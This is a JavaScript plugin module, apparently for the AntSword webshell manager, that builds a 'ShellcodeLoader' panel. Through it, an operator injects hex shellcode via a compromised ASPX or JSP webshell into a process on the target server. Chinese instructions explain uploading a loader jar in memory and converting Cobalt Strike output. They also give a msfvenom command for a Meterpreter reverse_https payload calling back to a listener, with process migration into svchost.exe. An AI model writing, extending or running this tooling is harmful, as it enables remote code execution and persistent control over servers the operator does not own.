"use strict";

const Base = require("../base");
const LANG = require("../../language"); // 插件语言库
const LANG_T = antSword["language"]["toastr"]; // 通用通知提示
class ShellcodeLoader extends Base {
  createToolbar(cell) {
    let self = this;
    let toolbar = cell.attachToolbar();
    this.toolbar = toolbar;
    if (self.shelltype == "aspx") {
      toolbar.attachEvent("onClick", function (id) {
        try {
          self.exploit();
        } catch (e) {
          toastr.error(JSON.stringify(e), LANG_T["error"]);
        }
      });
      toolbar.loadStruct(
        '<toolbar><item type="button" id="exploit" text="exploit" title="" /></toolbar>',
        function () {}
      );
    } else {
      toolbar.attachEvent("onClick", function (id) {
        switch (id) {
          case "AttachLoader":
            self.payloadtype = "AttachLoader";
            self.toolbar.enableItem("exploit");
            break;
          case "JnaLoader":
            self.payloadtype = "JnaLoader";
            self.toolbar.enableItem("exploit");
            break;
          case "exploit":
            try {
              self.exploit();
            } catch (e) {
              toastr.error(JSON.stringify(e), LANG_T["error"]);
            }
        }
      });
      toolbar.loadStruct(
        '<toolbar><item type="button" id="exploit" text="exploit" /><item type="separator" id="separator" /><item type="buttonSelect" id="method" text="加载方式" ><item type="button" id="JnaLoader" text="JnaLoader" /><item type="button" id="AttachLoader" text="AttachLoader" /></item></toolbar>',
        function () {}
      );
      toolbar.disableItem("exploit");
    }
  }
  createForm(cell) {
    var str = [
      { type: "settings", labelWidth: 80, inputWidth: 200 },
      {
        type: "radio",
        name: "ProcessMode",
        label: LANG["core"]["shellcode_loader"]["form"]["randomProcess"],
        checked: "1",
        value: "random",
        position: "label-right",
        list: [
          {
            type: "radio",
            name: "arch",
            label: "x32",
            checked: "1",
            value: "x32",
            position: "label-right",
          },
          { type: "newcolumn" },
          {
            type: "radio",
            name: "arch",
            label: "x64",
            value: "x64",
            position: "label-right",
          },
        ],
      },
      {
        type: "radio",
        name: "ProcessMode",
        label: LANG["core"]["shellcode_loader"]["form"]["setTargetProcess"],
        value: "manual",
        position: "label-right",
        list: [
          {
            type: "input",
            name: "targetProcess",
            label: LANG["core"]["shellcode_loader"]["form"]["targetProcess"],
            labelWidth: 100,
            offsetLeft: "20",
            offsetTop: "10",
            position: "label-left",
          },
        ],
      },
      {
        type: "input",
        name: "shellcode",
        label: "ShellCode (HEX)",
        labelWidth: 100,
        inputWidth: 600,
        inputHeight: 200,
        offsetLeft: "20",
        offsetTop: "10",
        required: true,
        rows: true,
      },
    ];
    var form = cell.attachForm(str);
    this.form = form;
    this.showTips();
  }

  showTips() {
    let tips = "";
    switch (this.shelltype) {
      case "aspx":
        tips = `输入hex格式的shellcode，且不能有多余换行跟空格.`;
        break;
      case "jsp":
        tips = `## JNA
利用第三方库JNA进行ShellCode的加载。
默认不注入java进程本身，不需要担心进程挂掉。
适用范围：JDK>=1.5

1. 首先利用Jar加载器将 ShellCodeLoader.jar 上传到目标服务器目录并加载。推荐使用内存加载方式，文件不落地。
2. 根据选项生成对应架构位数的shellcode，并开启监听。
3. 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。
4. 点击exploit，等待返回回话。

## Attach
模拟java agent注入过程来实现Shellcode的加载。
使用MSF时需要加上 PrependMigrate=true PrependMigrateProc=xxxx.exe 参数，自动迁移到新的进程，否则会在migrate/exit的时候把Java进程给干掉，导致网站瘫痪。
例如 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=4444  PrependMigrate=true PrependMigrateProc=svchost.exe -f hex
适用范围：JDK>=1.6

1. 基本信息，exploit，Ctrl+F 搜索  sun.arch.data.model ，查看java位数
2. 根据java位数生成对应位数的shellcode，并开启监听。
3. 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。
4. 点击exploit，等待返回回话。
`;
        break;
      default:
        break;
    }

    this.editor.session.setValue(tips);
  }

  format(str) {
    //将cobalt strike生成的shellcode转为hex
    str = str.substring(str.indexOf("{") + 1, str.lastIndexOf("}"));
    str = str.replace(/0x/g, "").replace(/,/g, "").replace(/ /g, "");
    // console.log(str);
    return str;
  }
  exploit() {
    let self = this;
    let args = {};
    self.core = this.top.core;
    let shellcode = this.form.getItemValue("shellcode");
    let ProcessMode = this.form.getCheckedValue("ProcessMode");
    let arch = "targetArch";
    let targetProcess = "targetProcess";
    if (ProcessMode == "random") {
      arch = this.form.getCheckedValue("arch");
    } else {
      targetProcess = this.form.getItemValue("targetProcess");
    }

    if (shellcode.indexOf("{") > 0) {
      shellcode = this.format(shellcode);
      this.form.setItemValue("shellcode", shellcode);
    }

    if (this.shelltype == "aspx") {
      self.parammode = 2;
      args["shellcode"] = shellcode;
    } else {
      args["targetShellCode"] = shellcode;
      // args["targetPID"] = targetPID;
      args["targetProcess"] = targetProcess;
      args["targetArch"] = arch;
    }

    let data = this.genPayload(args);
    self.core
      .request(data)
      .then((_ret) => {
        let res = antSword.unxss(_ret["text"], false);
        if (res === "") {
          res = "output is empty.";
        }
        switch (self.shelltype) {
          case "jsp":
          case "aspx":
          default:
            self.editor.session.setValue(res);
            self.editor.setReadOnly(true);
            break;
        }
        toastr.success(LANG["success"], LANG_T["success"]);
      })
      .catch((e) => {
        console.log(e);
        toastr.error(e.constructor === Object ? JSON.stringify(e) : e, "Error");
      });
  }
}
module.exports = ShellcodeLoader;
